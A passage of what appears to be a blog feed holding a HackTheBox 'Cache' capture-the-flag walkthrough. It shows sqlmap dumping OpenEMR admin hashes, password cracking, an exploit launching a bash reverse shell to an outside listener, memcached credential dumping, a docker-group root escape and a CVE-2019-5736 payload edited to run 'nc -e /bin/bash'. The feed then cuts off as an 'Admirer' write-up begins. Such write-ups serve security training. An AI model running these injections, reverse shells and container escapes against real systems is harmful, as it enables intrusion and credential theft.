fetching database names</span></span><br><span class="line"><span class="string">[10:44:25] [INFO] retrieved: &#x27;information_schema&#x27;</span></span><br><span class="line"><span class="string">[10:44:25] [INFO] retrieved: &#x27;openemr&#x27;</span></span><br><span class="line"><span class="string">available databases [2]:</span></span><br><span class="line"><span class="string">[*] information_schema</span></span><br><span class="line"><span class="string">[*] openemr</span></span><br></pre></td></tr></table></figure><p>Well that’s no surprise here. According to OpenEMR documentation, the admin user accounts are stored in the <code>users_secure</code> table. Let’s dump it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sqlmap -u <span class="string">&quot;http://hms.htb/portal/find_appt_popup_user.php?catid=1&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=fobps042o1oh4u325nqk3jnniv; OpenEMR=qsvth3m6bqdgnusejnn36bd1pe&quot;</span> -D openemr -T users_secure --dump</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[<span class="string">&quot;]_____ ___ ___  &#123;1.4.4#stable&#125;</span></span><br><span class="line"><span class="string">|_ -| . [&#x27;]     | .&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [&quot;</span>]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   http://sqlmap.org</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[10:47:56] [INFO] fetching columns <span class="keyword">for</span> table <span class="string">&#x27;users_secure&#x27;</span> <span class="keyword">in</span> database <span class="string">&#x27;openemr&#x27;</span></span><br><span class="line">[10:47:56] [WARNING] reflective value(s) found and filtering out</span><br><span class="line">[10:47:56] [INFO] retrieved: <span class="string">&#x27;id&#x27;</span></span><br><span class="line">[10:47:56] [INFO] retrieved: <span class="string">&#x27;username&#x27;</span></span><br><span class="line">[10:47:57] [INFO] retrieved: <span class="string">&#x27;password&#x27;</span></span><br><span class="line">[10:47:57] [INFO] retrieved: <span class="string">&#x27;salt&#x27;</span></span><br><span class="line">[10:47:57] [INFO] retrieved: <span class="string">&#x27;last_update&#x27;</span></span><br><span class="line">[10:47:57] [INFO] fetching entries <span class="keyword">for</span> table <span class="string">&#x27;users_secure&#x27;</span> <span class="keyword">in</span> database <span class="string">&#x27;openemr&#x27;</span></span><br><span class="line">[10:47:57] [INFO] retrieved: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">[10:47:58] [INFO] retrieved: <span class="string">&#x27;$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.&#x27;</span></span><br><span class="line">[10:47:58] [INFO] retrieved: <span class="string">&#x27;2019-11-21 06:38:40&#x27;</span></span><br><span class="line">[10:47:58] [INFO] retrieved: <span class="string">&#x27;$2a$05$l2sTLIG6GTBeyBf7TAKL6A$&#x27;</span></span><br><span class="line">[10:47:58] [INFO] retrieved: <span class="string">&#x27;openemr_admin&#x27;</span></span><br></pre></td></tr></table></figure><p>Alright,  we got <code>openemr_admin</code> password hash and password salt. </p><h3 id="Admin-hash-bruteforce"><a href="#Admin-hash-bruteforce" class="headerlink" title="Admin hash bruteforce"></a>Admin hash bruteforce</h3><p>The easiest way to authenticate to OpenEMR and achieve Remote Code Execution is to bruteforce the <code>openemr_admin</code> password hash we found earlier. At first look it seems like <code>bcrypt</code> hash. </p><p><code>hashid</code> can confirm our guess:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ hashid <span class="string">&quot;\$2a\$05\$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.&quot;</span> -mj</span><br><span class="line">Analyzing <span class="string">&#x27;$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.&#x27;</span></span><br><span class="line">[+] Blowfish(OpenBSD)</span><br><span class="line">[+] Woltlab Burning Board 4.x</span><br><span class="line">[+] bcrypt [Hashcat Mode: 3200][JtR Format: bcrypt]</span><br></pre></td></tr></table></figure><p>Let’s now use <code>john</code> to see if we can easily brute-force the hash:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ john --wordlist=~/SecLists/Passwords/Leaked-Databases/rockyou.txt hash.txt</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (bcrypt [Blowfish 32/64 X3])</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">xxxxxx           (?)</span><br><span class="line">1g 0:00:00:00 DONE (2020-05-10 16:48) 3.448g/s 2917p/s 2917c/s 2917C/s tristan..princesita</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure><p>Alright, we got the admin credentials: <code>openemr_admin</code>:<code>xxxxxx</code>. We can login on OpenEMR portal to make sure the informations are correct and move to the next step: Remote Code Execution.</p><img width="1134" alt="openemr admin login" src="https://user-images.githubusercontent.com/9076747/82307383-93c2a900-99c0-11ea-8321-a09b198be3f2.png"><h3 id="OpenEMR-Authenticated-Remote-Code-Execution"><a href="#OpenEMR-Authenticated-Remote-Code-Execution" class="headerlink" title="OpenEMR Authenticated Remote Code Execution"></a>OpenEMR Authenticated Remote Code Execution</h3><p>Coming from the same team who made the vulnerability report on OpenCRM we found earlier this Authenticated Remote Code Execution exploit on <code>searchsploit</code>. After a quick review nothing need to be changed to make it work on our instance. Let’s give it a try to open a reverse shell.</p><p>First let’s open our listener as usual:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cp /usr/share/exploitdb/exploits/php/webapps/45161.py openemr-rce.py</span><br><span class="line">[hg8@archbook ~]$ python openemr-rce.py http://hms.htb -u openemr_admin -p xxxxxx -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/10.10.10.10/8585 0&gt;&amp;1&#x27;</span></span><br><span class="line"> .---.  ,---.  ,---.  .-. .-.,---.          ,---.</span><br><span class="line">/ .-. ) | .-.\ | .-<span class="string">&#x27;  |  \| || .-&#x27;</span>  |\    /|| .-.\</span><br><span class="line">| | |(_)| |-<span class="string">&#x27; )| `-.  |   | || `-.  |(\  / || `-&#x27;</span>/</span><br><span class="line">| | | | | |--<span class="string">&#x27; | .-&#x27;</span>  | |\  || .-<span class="string">&#x27;  (_)\/  ||   (</span></span><br><span class="line"><span class="string">\ `-&#x27;</span> / | |    |  `--.| | |)||  `--.| \  / || |\ \</span><br><span class="line"> )---<span class="string">&#x27;  /(     /( __.&#x27;</span>/(  (_)/( __.<span class="string">&#x27;| |\/| ||_| \)\</span></span><br><span class="line"><span class="string">(_)    (__)   (__)   (__)   (__)    &#x27;</span>-<span class="string">&#x27;  &#x27;</span>-<span class="string">&#x27;    (__)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   =&#123;   P R O J E C T    I N S E C U R I T Y   &#125;=</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         Twitter : @Insecurity</span></span><br><span class="line"><span class="string">         Site    : insecurity.sh</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[$] Authenticating with openemr_admin:xxxxxx</span></span><br><span class="line"><span class="string">[$] Injecting payload</span></span><br></pre></td></tr></table></figure><p>And we get a new connection on our listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.188:59554</span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ </span><br></pre></td></tr></table></figure><p>Quickly we can see we need to pivot to <code>ash</code> user:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">www-data@cache:/var/www/html$ ls -l /home/ash</span><br><span class="line">drwxrwxr-x  2 root root  4096 May  5 11:17 Desktop</span><br><span class="line">drwxrwxr-x  2 root root  4096 Oct  9  2019 Documents</span><br><span class="line">drwxrwxr-x  2 root root  4096 Sep 18  2019 Downloads</span><br><span class="line">drwxrwxr-x  2 root root  4096 Sep 18  2019 Music</span><br><span class="line">drwxrwxr-x  2 root root  4096 Sep 18  2019 Pictures</span><br><span class="line">drwxrwxr-x  2 root root  4096 Oct  9  2019 Public</span><br><span class="line">-r-x------  1 ash  ash     33 May 10 16:27 user.txt</span><br></pre></td></tr></table></figure><h3 id="Pivot-www-data-gt-ash"><a href="#Pivot-www-data-gt-ash" class="headerlink" title="Pivot www-data -&gt; ash"></a>Pivot www-data -&gt; ash</h3><p>First let’s upgrade our shell to ease our recon:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">www-data@cache:/$ python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">www-data@cache:/$ <span class="built_in">export</span> TERM=xterm-256color</span><br><span class="line">www-data@cache:/$ <span class="built_in">export</span> SHELL=/bin/bash</span><br><span class="line">www-data@cache:/$ ^Z</span><br><span class="line">[1]+  Stopped        nc -l -vv -p 8585</span><br><span class="line">[hg8@archbook ~]$ stty raw -<span class="built_in">echo</span>;<span class="built_in">fg</span></span><br><span class="line">nc -l -vv -p 8585</span><br><span class="line">www-data@cache:/$                reset</span><br><span class="line">www-data@cache:/$ </span><br></pre></td></tr></table></figure><p>With this fully interactive shell we can now try to pivot to <code>ash</code> user using the credentials we found earlier. </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@cache:/$ su - ash</span><br><span class="line">Password: H@v3_fun</span><br><span class="line">ash@cache:~$ ls</span><br><span class="line">Desktop  Documents  Downloads  Music  Pictures  Public  user.txt</span><br><span class="line">ash@cache:~$ cat user.txt</span><br><span class="line">exxxxxxxxxxxxxxxxxxxx8</span><br></pre></td></tr></table></figure><h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>While doing our various usual recon task we notice a service listening on <code>11211</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ash@cache:~$ netstat -l</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State</span><br><span class="line">tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN</span><br><span class="line">tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN</span><br><span class="line">tcp        0      0 localhost.localdo:mysql 0.0.0.0:*               LISTEN</span><br><span class="line">tcp        0      0 localhost.localdo:11211 0.0.0.0:*               LISTEN</span><br><span class="line">tcp6       0      0 [::]:http               [::]:*                  LISTEN</span><br><span class="line">tcp6       0      0 [::]:ssh                [::]:*                  LISTEN</span><br><span class="line">tcp6       0      0 [::]:11211              [::]:*                  LISTEN</span><br><span class="line">udp        0      0 localhost:domain        0.0.0.0:*</span><br><span class="line">raw6       0      0 [::]:ipv6-icmp          [::]:*                  7</span><br></pre></td></tr></table></figure><p>Port <code>11211</code> correspond to <a href="https://memcached.org/">Memcached</a>:</p><blockquote><p>Memcached is a high-performance, distributed memory object caching system, generic in nature, but intended for use in speeding up dynamic web applications by alleviating database load.</p><p>Memcached is an in-memory key-value store for small chunks of arbitrary data (strings, objects) from results of database calls, API calls, or page rendering.</p><p><a href="https://memcached.org/">https://memcached.org/</a></p></blockquote><p>Given the name of the box, digging into the Memcached service might be worth it… </p><h3 id="Memcached-enumeration"><a href="#Memcached-enumeration" class="headerlink" title="Memcached enumeration"></a>Memcached enumeration</h3><p>According to the <a href="https://github.com/memcached/memcached/blob/master/doc/protocol.txt">documentation</a> connecting to port <code>11211</code> from <code>localhost</code> allows to <a href="https://amriunix.com/post/memcached-enumeration/">enumerate objects stored</a>:</p><p>First let’s connect to memcached using <code>telnet</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ash@cache:~$ telnet localhost 11211</span><br><span class="line">telnet localhost 11211</span><br><span class="line">Connected to localhost.localdomain.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line">version</span><br><span class="line">VERSION 1.5.6 Ubuntu</span><br></pre></td></tr></table></figure><p>Let’s print memory statistics with <code>stats slabs</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">stats slabs</span><br><span class="line">STAT 1:chunk_size 96</span><br><span class="line">STAT 1:chunks_per_page 10922</span><br><span class="line">STAT 1:total_pages 1</span><br><span class="line">STAT 1:total_chunks 10922</span><br><span class="line">STAT 1:used_chunks 5</span><br><span class="line">STAT 1:free_chunks 10917</span><br><span class="line">STAT 1:free_chunks_end 0</span><br><span class="line">STAT 1:mem_requested 371</span><br><span class="line">STAT 1:get_hits 0</span><br><span class="line">STAT 1:cmd_set 291</span><br><span class="line">STAT 1:delete_hits 0</span><br><span class="line">STAT 1:incr_hits 0</span><br><span class="line">STAT 1:decr_hits 0</span><br><span class="line">STAT 1:cas_hits 0</span><br><span class="line">STAT 1:cas_badval 0</span><br><span class="line">STAT 1:touch_hits 0</span><br><span class="line">STAT active_slabs 1</span><br><span class="line">STAT total_malloced 1048576</span><br><span class="line">END</span><br></pre></td></tr></table></figure><p>We have only one object in memory. Let’s fetch the key’s names associated with this one:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">stats cachedump 1 0</span><br><span class="line">ITEM link [21 b; 0 s]</span><br><span class="line">ITEM user [5 b; 0 s]</span><br><span class="line">ITEM passwd [9 b; 0 s]</span><br><span class="line">ITEM file [7 b; 0 s]</span><br><span class="line">ITEM account [9 b; 0 s]</span><br><span class="line">END</span><br></pre></td></tr></table></figure><p>Looks good! We have a user and password key. Let’s dump the values stored in it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">get link</span><br><span class="line">VALUE link 0 21</span><br><span class="line">https://hackthebox.eu</span><br><span class="line">END</span><br><span class="line"></span><br><span class="line">get user</span><br><span class="line">get user</span><br><span class="line">VALUE user 0 5</span><br><span class="line">luffy</span><br><span class="line">END</span><br><span class="line"></span><br><span class="line">get passwd</span><br><span class="line">get passwd</span><br><span class="line">VALUE passwd 0 9</span><br><span class="line">0n3_p1ec3</span><br><span class="line">END</span><br></pre></td></tr></table></figure><h3 id="Pivot-ash-gt-luffy"><a href="#Pivot-ash-gt-luffy" class="headerlink" title="Pivot ash -&gt; luffy"></a>Pivot ash -&gt; luffy</h3><p>Since we have <code>luffy</code> credentials let’s just try to login through SSH:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh luffy@cache.htb</span><br><span class="line">luffy@cache.htb<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-99-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Wed May  6 08:54:44 2020 from 10.10.14.3</span></span><br><span class="line"><span class="string">luffy@cache:~$ </span></span><br></pre></td></tr></table></figure><p>Alright we are now logged as <code>luffy</code>. Uppon quick enumeration we noticed <code>luffy</code> is hosting docker:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">luffy@cache:~$ groups</span><br><span class="line">luffy docker</span><br><span class="line">luffy@cache:~$ ip a</span><br><span class="line">[...]</span><br><span class="line">docker0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255</span><br><span class="line">        ether 02:42:a1:bd:9d:e8  txqueuelen 0  (Ethernet)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line">     </span><br></pre></td></tr></table></figure><h3 id="Docker-Privilege-Escalation"><a href="#Docker-Privilege-Escalation" class="headerlink" title="Docker Privilege Escalation"></a>Docker Privilege Escalation</h3><p>Belonging to <code>docker</code> group gives extra permissions related to docker. This is going to allow us to use the widely know docker privilege escalation technique which consist in using the permission to run container with host mounted volumes. Let’s see how it’s done.</p><p>First we need to have a docker image available. It’s our luck there is an <code>ubuntu</code> image already installed:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">luffy@cache:/$  docker image list</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">ubuntu              latest              2ca708c1c9cc        7 months ago        64.2MB</span><br></pre></td></tr></table></figure><p>Then we can spawn an interactive <code>root</code> shell alongside the <code>-v</code> option to mount the entire filesystem of the host to the <code>ubuntu</code> container:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">luffy@cache:/tmp$ docker run -v /:/mnt -it ubuntu chroot /mnt sh</span><br><span class="line"><span class="comment"># cat /root/root.txt</span></span><br><span class="line">3xxxxxxxxxxxxxxxxxxxx2</span><br></pre></td></tr></table></figure><h2 id="“Intended”-way-to-root"><a href="#“Intended”-way-to-root" class="headerlink" title="“Intended” way to root"></a>“Intended” way to root</h2><p>While I am pretty sure this is the indented way to <code>root</code>  most people probably missed/skipped it for the easiest version from Docker group privilege escalation. </p><p>With that being said let’s see this second way to root.</p><p>Uppon checking the docker version we notice it’s an old one (<code>18.09.2</code>):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">luffy@cache:~$ luffy@cache:~$ docker --version</span><br><span class="line">Docker version 18.09.1, build 4c52b90   </span><br></pre></td></tr></table></figure><p><code>Searhsploit</code> returns an interesting result for this version:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ searchsploit docker</span><br><span class="line">----------------------------------------------------------- -----------------------------------</span><br><span class="line"> Exploit Title                                             |  Path</span><br><span class="line">                                                           | (/usr/share/exploitdb/)</span><br><span class="line">----------------------------------------------------------- -----------------------------------</span><br><span class="line">[...]</span><br><span class="line">runc &lt; 1.0-rc6 (Docker &lt; 18.09.2) - Container Breakout (2) | exploits/linux/<span class="built_in">local</span>/46369.md</span><br><span class="line">----------------------------------------------------------- -----------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure><p>Let’s dig in!</p><h3 id="Docker-container-escape-via-runC-CVE-2019-5736"><a href="#Docker-container-escape-via-runC-CVE-2019-5736" class="headerlink" title="Docker container escape via runC (CVE-2019-5736)"></a>Docker container escape via runC (CVE-2019-5736)</h3><p>The <a href="https://www.openwall.com/lists/oss-security/2019/02/11/2">advisory</a> on this CVE describe the issue this way:</p><blockquote><p>The vulnerability allows a malicious container to overwrite the host runc binary and thus gain root-level<br>code execution on the host. The level of user interaction is being able to run any command as root within a container in either of these contexts:</p><ul><li>Creating a new container using an attacker-controlled image.</li><li>Attaching (docker exec) into an existing container which the<br>attacker had previous write access to.</li></ul><p>This vulnerability is <em>not</em> blocked by the default AppArmor policy, nor<br>by the default SELinux policy on Fedora. […]</p><p><a href="https://www.openwall.com/lists/oss-security/2019/02/11/2">https://www.openwall.com/lists/oss-security/2019/02/11/2</a></p></blockquote><p>Sounds like exactly our context. We can even find a <a href="https://github.com/Frichetten/CVE-2019-5736-PoC">Proof Of Concept on Github</a>. Let’s give it a try:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ git <span class="built_in">clone</span> https://github.com/Frichetten/CVE-2019-5736-PoC.git</span><br><span class="line">[hg8@archbook ~]$ <span class="built_in">cd</span> CVE-2019-5736-PoC/</span><br></pre></td></tr></table></figure><p>We need to edit the <code>main.go</code> payload in order to open a reverse shell:</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">- var payload = &quot;#!/bin/bash \n cat /etc/shadow &gt; /tmp/shadow &amp;&amp; chmod 777 /tmp/shadow&quot;</span></span><br><span class="line"><span class="addition">+ var payload = &quot;#!/bin/bash \n /tmp/nc -e /bin/bash 172.18.0.1 8585&quot; </span></span><br></pre></td></tr></table></figure><p>Then we can build the exploit and send it alongside a copy of <code>netcat</code> to the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ go build main.go</span><br><span class="line">[hg8@archbook ~]$ scp nc main luffy@cache:~$:/tmp/.hg8</span><br></pre></td></tr></table></figure><p>We have everything ready, let’s open our <code>nc</code> listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><p>And finally run the exploit:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">luffy@cache:/tmp/.hg8$ docker run --rm --name pwnme -dit ubuntu bash</span><br><span class="line">7d998e09dd6fece9947f744eb945e60eb755a6862898958dd4ef3fb954111063</span><br><span class="line">luffy@cache:/tmp/.hg8$ docker cp main pwnme:/tmp/CVE-2019-5736</span><br><span class="line">luffy@cache:/tmp/.hg8$ docker cp nc pwnme:/tmp/nc</span><br><span class="line">luffy@cache:/tmp/.hg8$ docker attach pwnme</span><br><span class="line">root@7d998e09dd6f:/<span class="comment"># chmod +x /tmp/CVE-2019-5736</span></span><br><span class="line">root@7d998e09dd6f:/<span class="comment"># ./tmp/CVE-2019-5736</span></span><br><span class="line">[+] Overwritten /bin/sh successfully</span><br></pre></td></tr></table></figure><p>At this point we open a new SSH connection as <code>luffy</code> and open a new <code>sh</code> shell from the <code>pwnme</code> container:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">luffy@cache:~$ docker <span class="built_in">exec</span> -it pwnme /bin/sh</span><br><span class="line">No <span class="built_in">help</span> topic <span class="keyword">for</span> <span class="string">&#x27;/bin/sh&#x27;</span></span><br></pre></td></tr></table></figure><p>And we get a new connection on our listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.188:44040</span><br><span class="line">$ whoami</span><br><span class="line">root</span><br><span class="line">$ cat /root/root.txt</span><br><span class="line">3xxxxxxxxxxxxxxxxxxxxxx2</span><br></pre></td></tr></table></figure><hr><p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p><p>See you next time ;)</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Medium Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> cache </tag>
            
            <tag> openerm </tag>
            
            <tag> sqli </tag>
            
            <tag> John </tag>
            
            <tag> bcrypt </tag>
            
            <tag> RCE </tag>
            
            <tag> memcached </tag>
            
            <tag> docker </tag>
            
            <tag> CVE-2019-5736 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Admirer</title>
      <link href="/posts/admirer/"/>
      <url>/posts/admirer/</url>
      
        <content type="html"><![CDATA[<img width="584" alt="admirer-hackthebox" src="https://user-images.githubusercontent.com/9076747/82153714-7fb86380-9869-11ea-90dd-c0d45e1273c9.png"><p>Admirer just retired on Hackthebox, it’s an easy difficulty Linux machine with a user difficulty rating of 5.2/10. While rated easy I wouldn’t recommended it for beginners since it’s easy to miss important information and get stuck at soon as foothold. While doing the box I found it a bit frustrating to gather all the pieces of the puzzle together properly. But once done and looking back the box feel very well designed and quite straightforward even though the few rabbits holes. </p><p><strong>Tl;Dr:</strong> To get the user flag you had to find an instance of <code>Adminer</code> Database, and, after a lot of enumeration to find credentials to get into an FTP server and grab a backup of the web app. Then you connect to AdminerDB using your own MySQL server and from there you can exploit a vulnerability allowing to read local files using SQL. This way you retrieve <code>waldo</code> user MySQL credentials, and those credentials are working on SSH allowing us to retrieve the flag.<br>The root flag is accessible after overwriting the python library <code>shutils</code> using <code>PYTHONPATH</code> environnement variable to make privilege escalation from a python script running as root. </p><p>Alright! Let’s get into the details now!</p><hr><p>First thing first, let’s add the box IP to the hosts file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.187 admirer.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>and let’s start!</p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User 